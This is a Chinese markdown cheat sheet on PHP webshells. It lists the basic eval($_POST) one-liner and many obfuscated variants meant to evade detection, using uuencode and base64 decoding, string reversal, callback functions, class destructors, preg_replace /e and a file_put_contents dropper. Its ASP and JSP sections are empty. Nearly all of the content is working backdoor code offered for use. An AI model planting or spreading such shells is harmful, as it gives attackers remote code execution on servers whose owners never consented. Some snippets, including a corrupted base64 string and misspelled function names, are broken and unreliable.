## webshell木马
#木马 #webshell
### php
**一句话木马原型：**
```php
<?php eval($_POST["a"]);?>
```
两个函数`eval`和`assert`,**eval是语言构造器而非函数，不能被可变函数调用。**
可用的php字符串操作
```php
convert_uudecode() #解码一个 uuencode 编码的字符串。
convert_uuencode() #使用 uuencode 编码一个字符串。
ucwords() #函数把字符串中每个单词的首字符转换为大写。
strrev () #反转字符串
trim() #函数从字符串的两端删除空白字符和其他预定义字符。
substr_replace() #函数把字符串的一部分替换为另一个字符串
substr() #函数返回字符串的一部分。
strtr() #函数转换字符串中特定的字符。
strtoupper() #函数把字符串转换为大写。
strtolower() #函数把字符串转换为小写。
implode()  #将一个一维数组的值转化为字符串。
str_rot13() #函数对字符串执行 ROT13 编码。
```
**编码绕过：**
```php
<?php
// 使用 uuencode 编码一个字符串
$a=convert_uuencode("assert");
$b=convert_uudecode($a);
$b($_POST["a"]);
?>
```
**自定义函数绕过：**
```php
<?php
function change($a){
    $a($_POST["a"]);
}
change(assert);
?>
```
可用的回调函数：
```php
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```
**回调函数绕过：**
```php
<?php 
forward_static_call_array(assert,array($_POST["a"]));
?>
```
**函数+回调绕过：**
```php
<?php
function change($a,$b){
    forward_static_call_array($a,$b);
}
change(assert,array($_POST["a"]));
?>
```
**类+回调绕过：**
```php
<?php
class change{
    var $a;
    var $b;
    function __construct($a,$b)
    {
        $this->a=$a;
        $this->b=$b;
    }
    function test(){
        forward_static_call_array($this->a,$this->b);
    }
}
$s1= new change(assert,array($_POST["a"]));
$s1->test();
?>
```
**特殊符号绕过：**
```php
<?php
$a = $_POST[\'a\'];
$b = "\n";
eval($b.=$a);
?>
```
**数组绕过：**
```php
<?php
$a=strrev("tressa");
$b=[\'\'=>$a($_POST["a"])];
?>
```
**类绕过：**
```php
<?php 
class change
{
  public $a = \'\';
  function __destruct(){
    assert("$this->a");
  }
}

$b = new change;
$b->a = $_POST["a"];
?>
```
**base64编码绕过：**
```php
<?php
$a = base64_decode("YXNz+ZX____J____0");
$a($_POST["a"]);
?>
```
```php
```
**create_function：**
```php
<?php 
$fun = create_function('',$_POST['a']);
$fun();
?>
```
**call_user_func：**
```php
<?php
@call_user_func(assert,$_POST['a']);
?>
```
**preg_replace：**
/e参数可以将后面的参数作为代码执行。
```php
<?php 
@preg_replace("/abcde/e", $_POST['a'], "abcdefg");
?>

<?php @mb_ereg_replace('.*',$_POST['a'],'','ee');?>
<?php @mb_eregi_replace('.*',$_POST['a'],'','ee');?>

<?php @mbereg_replace('.*',$_POST['a'],'','ee');?>
<?php @mberegi_replace('.*',$_POST['a'],'','ee');?>
```
**file_put_contents：**
```php
<?php
$test='<?php $a=$_POST["a"];assert($a); ?>';
file_put_contents("core.php", $test);
?>
```
**parse_str：**
```php
<?php
$str="a=eval";
parse_str($str);
$a($_POST['a']);
?>
```
### asp
```

```
### jsp